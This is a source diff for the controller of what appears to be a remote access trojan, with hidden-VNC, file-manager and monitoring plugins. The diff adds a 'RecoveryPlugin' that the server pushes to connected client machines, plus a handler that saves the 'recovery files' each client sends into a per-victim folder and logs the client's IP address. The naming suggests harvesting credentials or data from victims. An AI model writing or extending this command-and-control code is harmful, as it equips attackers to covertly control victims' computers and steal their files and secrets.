@@ -26,6 +26,7 @@ const
   OPEN_URL_PLUGIN_ID          = 'OpenURLPlugin';
   FILE_MANAGER_PLUGIN_ID      = 'FileManagerPlugin';
   HIDDEN_VNC_PLUGIN_ID        = 'HiddenVNCPlugin';
+  RECOVERY_PLUGIN_ID          = 'RecoveryPlugin';
 
   MAX_JSON_BUFFER_SIZE      = 128 * 1024 * 1024;
   PACKET_TYPE_JSON          = $01;
@@ -34,6 +35,7 @@ const
   PACKET_TYPE_FILE_UPLOAD   = $04;
   PACKET_TYPE_FILE_DOWNLOAD = $05;
   PACKET_TYPE_HVNC_FRAME    = $06;
+  PACKET_TYPE_RECOVERY_FILE = $07;
 
   MONITOR_FRAME_FORMAT_JPEG = 1;
   HVNC_FRAME_FORMAT_JPEG_FULL  = 1;
@@ -142,6 +144,7 @@ type
     procedure ProcessJSONMessage(aLine: TncLine; const RawStr: string);
     procedure ProcessMonitoringBinaryFrame(aLine: TncLine; const Payload: TBytes);
     procedure ProcessHVNCBinaryFrame(aLine: TncLine; const Payload: TBytes);
+    procedure ProcessRecoveryBinaryPacket(aLine: TncLine; const Payload: TBytes);
     procedure ProcessFileManagerBinaryPacket(aLine: TncLine;
       PacketType: Byte; const Payload: TBytes);
 
@@ -176,6 +179,7 @@ type
     procedure SendOpenURLPlugin(aLine: TncLine);
     procedure SendFileManagerPlugin(aLine: TncLine);
     procedure SendHiddenVNCPlugin(aLine: TncLine);
+    procedure SendRecoveryPlugin(aLine: TncLine);
 
     function  TryGetClientInfo(aLine: TncLine; out Info: TClientInfo): Boolean;
     function  IsActive   : Boolean;
@@ -988,6 +992,9 @@ begin SendPlugin(aLine, FILE_MANAGER_PLUGIN_ID); end;
 procedure TServerManager.SendHiddenVNCPlugin(aLine: TncLine);
 begin SendPlugin(aLine, HIDDEN_VNC_PLUGIN_ID); end;
 
+procedure TServerManager.SendRecoveryPlugin(aLine: TncLine);
+begin SendPlugin(aLine, RECOVERY_PLUGIN_ID); end;
+
 { ---------------------------------------------------------------------- }
 {  Server Events                                                           }
 { ---------------------------------------------------------------------- }
@@ -1204,6 +1211,8 @@ begin
         ProcessMonitoringBinaryFrame(aLine, BP.Payload)
       else if BP.PacketType = PACKET_TYPE_HVNC_FRAME then
         ProcessHVNCBinaryFrame(aLine, BP.Payload)
+      else if BP.PacketType = PACKET_TYPE_RECOVERY_FILE then
+        ProcessRecoveryBinaryPacket(aLine, BP.Payload)
       else if BP.PacketType = PACKET_TYPE_FILE_DOWNLOAD then
         ProcessFileManagerBinaryPacket(aLine, BP.PacketType, BP.Payload);
     end;
@@ -1267,6 +1276,51 @@ begin
     HVNCForm.QueueFrameBytes(FrameBytes, Integer(FrameHeader.Width), Integer(FrameHeader.Height),
       Integer(FrameHeader.Format), Integer(FrameHeader.DirtyX), Integer(FrameHeader.DirtyY),
       Integer(FrameHeader.DirtyW), Integer(FrameHeader.DirtyH), Integer(FrameHeader.FPS));
+end;
+
+
+procedure TServerManager.ProcessRecoveryBinaryPacket(aLine: TncLine; const Payload: TBytes);
+var
+  PathLen: Cardinal;
+  DataSize: Integer;
+  RelPath: string;
+  Info: TClientInfo;
+  SavePath: string;
+  FS: TFileStream;
+  ClientDir: string;
+begin
+  if Length(Payload) < 4 then Exit;
+  Move(Payload[0], PathLen, 4);
+  if Length(Payload) < Integer(4 + PathLen) then Exit;
+
+  RelPath := TEncoding.UTF8.GetString(Payload, 4, PathLen);
+  { Basic path sanitization }
+  RelPath := RelPath.Replace('\', '/').Replace('..', '');
+  while RelPath.StartsWith('/') do Delete(RelPath, 1, 1);
+
+  if not TryGetClientInfo(aLine, Info) then Exit;
+
+  ClientDir := ExtractFilePath(ParamStr(0)) + 'Clients Folder\' + Info.ID + '\Recovery\';
+  SavePath := ClientDir + RelPath.Replace('/', '\');
+
+  ForceDirectories(ExtractFilePath(SavePath));
+
+  DataSize := Length(Payload) - (4 + Integer(PathLen));
+  if DataSize < 0 then Exit;
+
+  try
+    FS := TFileStream.Create(SavePath, fmCreate);
+    try
+      if DataSize > 0 then
+        FS.WriteBuffer(Payload[4 + PathLen], DataSize);
+    finally
+      FS.Free;
+    end;
+    DoLog(lcCommand, 'Recovery file saved: ' + RelPath + ' [' + Info.IPAddress + ']');
+  except
+    on E: Exception do
+      DoLog(lcError, 'Failed to save recovery file ' + RelPath + ': ' + E.Message);
+  end;
 end;
 
 procedure TServerManager.ProcessFileManagerBinaryPacket(aLine: TncLine;
@@ -1431,6 +1485,7 @@ begin
         else if SameText(PluginID, OPEN_URL_PLUGIN_ID)          then SendOpenURLPlugin(aLine)
         else if SameText(PluginID, FILE_MANAGER_PLUGIN_ID)      then SendFileManagerPlugin(aLine)
         else if SameText(PluginID, HIDDEN_VNC_PLUGIN_ID)        then SendHiddenVNCPlugin(aLine)
+        else if SameText(PluginID, RECOVERY_PLUGIN_ID)          then SendRecoveryPlugin(aLine)
         else SendPlugin(aLine, PluginID);
       end;
       Exit;
